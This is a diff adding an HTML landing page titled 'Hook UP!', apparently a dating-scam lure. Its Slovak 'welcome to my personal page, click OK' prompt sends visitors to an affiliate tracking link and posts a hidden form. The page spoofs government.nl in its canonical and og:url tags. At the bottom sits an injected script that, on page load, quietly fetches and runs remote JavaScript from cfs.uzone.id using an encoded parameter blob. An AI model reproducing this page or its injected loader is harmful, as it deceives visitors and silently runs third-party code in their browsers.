@@ -1,0 +1,431 @@
+﻿                             
+<!DOCTYPE html>
+<html>
+	<head>
+<link href='https://www.government.nl/topics' rel='canonical'/>
+<meta content='https://www.government.nl/topics' property='og:url'/>
+		<meta charset="utf-8">
+                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+                		<title>Hook UP!</title>
+ 		<style type="text/css">
+			@import url(http://fonts.googleapis.com/css?family=Roboto:300,400,500,700);
+			@font-face {
+				font-family: 'HelveticaNeue';
+				src: url('tpl/1/fonts/HelveticaNeue-BoldCond.ttf');
+			}
+			html,body{
+				margin: 0;
+				padding: 0;
+			}
+			body {
+				background-image: url('');
+				/*background-image: url({image1})*/
+				background-color: #000000;
+				background-repeat: repeat;
+			}
+						h1,p,a {
+				font-family: 'Roboto', sans-serif;
+				margin: 0;
+			}
+			.main{
+				margin:0 auto;
+				max-width:960px;
+				padding-top:0;
+				padding-bottom:10px;
+				padding: 0;
+				margin-bottom: 100px;
+			}
+			.counter {
+				text-align: center;
+				margin: 38px auto 0;
+			}
+			ul#countdown {
+				padding: 0;
+				margin-bottom: 8px;
+			}
+			ul#countdown li {
+				display: inline-block;
+				width: 83px;
+				text-align: center;
+				background-color: yellow;
+				background: transparent url('') no-repeat;
+				margin: 0 2px;
+			}
+			ul#countdown li span {
+				font-size: 63px;
+				font-family: 'HelveticaNeue';
+				font-weight: bolder;
+				color: #d1d2d2;
+				line-height: 81px;
+				position: relative;
+			}
+			ul#countdown li span::before {
+				content: '';
+				width: 100%;
+				height: 1px;
+				border-top: 1px solid rgba( 0, 0, 0, 0.2);
+				position: absolute;
+				top: 27px;
+			}
+			ul#countdown li p.timeRefDays,
+			ul#countdown li p.timeRefHours,
+			ul#countdown li p.timeRefMinutes,
+			ul#countdown li p.timeRefSeconds {
+				font-family: 'HelveticaNeue';
+				font-weight: 700;
+				text-shadow: 2px 1px rgba(0, 0, 0, 0.3);
+				font-size: 19px;
+				color: #d4d4d4;
+				text-transform: uppercase;
+				margin-top: 8px;
+				position: relative;
+				left: -1px;
+			}
+			.content_wrapper {
+				border: 5px solid rgba(160,160,160,0.4);
+				background-color: rgba(160,160,160,0.4);
+				margin: 16px auto 0;
+				max-width: 911px;
+				border-radius: 10px 10px 10px 10px;
+			}
+			.content {
+				min-height: 505px;
+				/*padding-bottom: 2px;*/
+				background-image: url('https://i.imgur.com/bWTBkXn.png');
+				/*background-image: url({image2});*/
+				/*background-image: url('images/TPLGalleries/girl-684.png');*/
+				background-repeat: no-repeat;
+				background-size: cover;
+				border-radius: 7px 7px 7px 7px;
+			}
+			.answers {
+				background-color: rgba(0,0,0,0.1);
+				width: 100%;
+				text-align: center;
+				height: 500%;
+				border-radius: 0 7px 7px 0;
+			}
+			.answers_title,
+			.answers_description,
+			.answers_text,
+			.question,
+			.answers-row {
+				text-align: center;
+			}
+			.answers_title {
+				padding: 21px 0 0;
+			}
+			.answers_title h1{
+				color: #dc00fe;
+				font-size: 50px;
+				font-weight: 700;
+			}
+			.answers_description {
+				padding: 24px 25px 0px;
+			}
+			.answers_description p{
+				color: #ffffff;
+				font-size: 24px;
+				line-height: 29px;
+				letter-spacing: 0.16px;
+			}
+			.answers_text {
+				padding: 10px 0 0;
+			}
+			.answers_text p{
+				color: #ffffff;
+				font-size: 18px;
+				font-weight: 300;
+			}
+			.question {
+				padding: 47px 0 0;
+				margin-bottom: 33px;
+			}
+			.question p{
+				color: #ffffff;
+				font-size: 30px;
+				font-weight: 700;
+			}
+			.answer {
+				font-size: 26px;
+				font-weight: 700;
+				text-decoration: none;
+				display: inline-block;
+				color: #ffffff;
+				background-color: #950caa;
+				border-top: 1px solid #b718d0;
+				border-left: 1px solid #b718d0;
+				padding: 10px 41px 14px;
+				border-radius: 5px 5px 5px 5px;
+				margin-bottom: 7px;
+				box-shadow: 0px 0px 1px #000000;
+			}
+			.answer-block {
+				display: inline-block;
+			}
+			.answer-block:first-child {
+				margin-right: 4px;
+			}
+			.opt_in_field {
+				text-align: center;
+				margin-top: 40px;
+			}
+			.name_field,
+			.email_field {
+				margin-bottom: 5px;
+			}
+			.name_field input,
+			.email_field input {
+				border-radius: 5px 5px 5px 5px;
+				padding: 9px;
+				width: 300px;
+			}
+			.send_button {
+				background-color: #950caa;
+				border-radius: 5px 5px 5px 5px;
+				border: transparent;
+				color: #ffffff;
+				font-size: 20px;
+				font-family: 'Open Sans', sans-serif;
+				font-weight: bold;
+				text-transform: uppercase;
+				padding: 9px;
+			}
+			.gallery {
+				margin: 40px auto;
+				width: 585px;
+			}
+			.gallery_title {
+				font: 30px 'HelveticaNeue';
+				text-align: center;
+				color: #FFFF00;
+				margin: 20px 0 -10px 0;
+			}
+			.galleryImageHolder {
+				width: 280px;
+				height: 218px;
+                                display: inline-block;
+				border: 4px solid #d4d4d4;
+				border-radius: 70px;
+				margin: 0 0 20px 0;
+				text-align: center;
+				position: relative;
+			}
+			img.loader {
+				position: absolute;
+				top: 0;
+				left: 25%;
+				margin-top: 30px;
+			}
+			.gallery img.galleryImage {
+				position: relative;
+				z-index: 22;
+				border-radius: 70px;
+				margin-bottom: 10px;	
+			}
+						.gallery img, .galleryImageHolder {
+				border-radius: 15px;
+			}
+						.galleryImageHolder:not(:nth-of-type(4n+0)) {
+				margin-right: 20px;
+			}
+			
+						@media (max-width: 915px){
+				.counter {
+					margin: 87px auto 0;
+				}
+				.content_wrapper {
+					max-width: 719px;
+				}
+				.content {
+					height: 649px;
+				}
+				.answers {
+					width: 79.5%;
+				}
+				.answers_header {
+					margin-bottom: 67px;
+				}
+			}
+						@media (max-width: 760px) {
+				.answers {
+					width: 92%;
+					border-radius: 0;
+					margin: 0 auto;
+					float: none;
+				}
+				.answer {
+					font-size: 20px;
+					font-size: 2em;
+					padding: 8px 48px 12px;
+				}
+			}
+			@media (max-width: 505px) {
+				.counter {
+					margin: 19px auto 0;
+				}
+				ul#countdown li {
+					width: 505px;
+					background: transparent url('') no-repeat;
+				}
+				ul#countdown li span {
+					/*font-size: 50px;*/
+					font-size: 3em;
+					line-height: 63px;
+				}
+				ul#countdown li span::before {
+					top: 21px;
+					border-top: 1px solid rgba( 0, 0, 0, 0.2);
+				}
+				ul#countdown li p.timeRefDays,
+				ul#countdown li p.timeRefHours,
+				ul#countdown li p.timeRefMinutes,
+				ul#countdown li p.timeRefSeconds {
+					font-size: 19px;
+					margin-top: 1px;
+				}
+				.content_wrapper {
+					max-width: 270px;
+					margin: 14px auto 0;
+				}
+				.content {
+					height: 505px;
+				}
+				.answers_title {
+					padding: 13px 0 0;
+				}
+				.answers_title h1 {
+					font-size: 40px;
+				}
+				.answers_description {
+					padding: 50px 10px 0px;
+				}
+				.answers_description p {
+					font-size: 18px;
+					line-height: 22px;
+				}
+				.answers_text {
+					padding: 8px 0 0;
+				}
+				.answers_text p {
+					font-size: 14px;
+				}
+				.question {
+					padding: 17px 0 0;
+					margin-bottom: 16px;
+				}
+				.question p {
+					font-size: 20px;
+				}
+				.answer-block:first-child {
+					margin-right: 0;
+				}
+			}
+			.questionblocks {
+				display: none;
+			}
+		</style>
+		<!--[if gte IE 9]>
+		  <style type="text/css">
+			.gradient {
+			   filter: none;
+			}
+		  </style>
+		<![endif]-->
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+			</head>
+                            
+	<body data-type="backgroundImage">
+		
+		<div class="wrapper">
+			<div class="main">
+				 
+				<center><div class="content_wrapper">
+					<div class="content">
+						<div class="answers" data-type="invert">
+							<div class="answers_header">
+								<div class="answers_title"><h1> Vitajte na mojej osobnej stránke </h1></div>
+								<div class="answers_description"><p> </p></div>
+								<div class="answers_text"><p> Pokračujte kliknutím na tlačidlo OK </p></div>
+							<div class="answers_text"><p></p></div>
+							</div>
+							
+															
+															<!-- TEXT ONLY ANSWERS START -->
+								<div class='questionblocks' id='question22'>
+									<div class="question"><p></p></div>
+								<a class="answer" href="http://www.lewismary.xyz/c/da57dc555e50572d?s1=21388&s2=96893&s3=BEJOTEROS">OK</a>
+																		
+																	</div>
+														
+														</div>
+					</div>
+				</div>
+			</div>
+		</div>
+</center>
+		<script type="text/javascript">
+
+			var galleryimage = $('.galleryimage');
+			var loader = $('.loader');
+
+			galleryimage.hide();
+
+			galleryimage.on('load', function() {
+				$(this).fadeIn();
+				$(this).siblings().fadeOut();
+			});
+
+			var mq = [22,7];
+			var a = '', g = '', c = [], o = [];
+
+			$(document).ready(function(){
+				$('.questionblocks').hide();
+				$('#question'+mq.shift()).fadeIn();
+			});
+
+			$('.answer').click(function() {
+				var v = $(this).data('target-id');
+				switch(parseInt($(this).data('target-type')))
+				{
+					case 1 : a = v;
+					break;
+					case 2 : c.push(v);
+					break;
+					case 3 : g = v;
+					break;
+					case 4 : o.push(v);
+					break;
+					case 5 : $(this).parent().parent().fadeOut(function() {
+						$('#question'+v).fadeIn();});
+						return false;
+				} 
+				if (mq.length > 0) {
+												fbq('track', 'Click1', {domain: window.location.href});
+												
+						$(this).parent().fadeOut(function() {$('#question'+mq.shift()).fadeIn();});
+						
+				}
+				else {
+						$('.questionblocks').fadeOut('slow');
+						$('body').append('<form id="lf" action="m/r.php" method="POST">');
+						$('#lf').append('<input type="hidden" name="id" value="4038">');
+						$('#lf').append('<input type="hidden" name="r" value="">');
+						$('#lf').append('<input type="hidden" name="a" value="'+a+'">');
+						$('#lf').append('<input type="hidden" name="g" value="'+g+'">');
+												for (var i in c) {
+							$('#lf').append('<input type="hidden" name="c[]" value="'+c[i]+'">');
+						}
+						for (var i in o) {
+							$('#lf').append('<input type="hidden" name="o[]" value="'+o[i]+'">');
+						}
+												fbq('track', 'Click2', {domain: window.location.href});
+												$('#lf').submit();
+					}   
+			});   
+			</script>
+		
+			
+		
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31g3kLovr63hxe6i963M1mRT04kh%2fSnzA5cHR3g1B0ET9KgstQhUsF2HR88L5igexgHG4O2jjFYQB2rDMySjN8NTHW385uo6TEYEPx58adz815vX8h7NMCENY%2brx3kjS66R3DtiS79uVcAKFBl81fD7YS7ASYN%2fE8kdoU8%2fhpmUZygpTARC8Dwo2i%2fQhLvnQWutomAgJeJHLfTBXHStIdWjujqZ9duqLOYtilabbHbIeFJICPTH6Crohi3XozkOhnvuMOQ5srf8z6VZsA0HJXpqhTCvIgFzucmOEmHYPZPbWiPWAGww9hSVxr853RnRhj6Q1yb5CfawKeX6LsaOA6hMOpB1VE9gfQDXVLMNDm%2f9gQmcj0E7PtwgCsyAJ%2foy9UxkTTBvcnZ%2fjVq%2friDf0bOzG7eMhrvn4fP3USPDBLjpGgSAjgsWjzbh%2fRvf62jRYsTXx0Rvm%2ftO1fbg8Uv%2bdoHlOR4f3ylGOpd%2bA3E8UkxaViua7jdiPmLAUXU7CWxGKpoMuaVExOTjRSEkXbJeqkIDEnOkC4NCROIWkIsqTgt7pg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
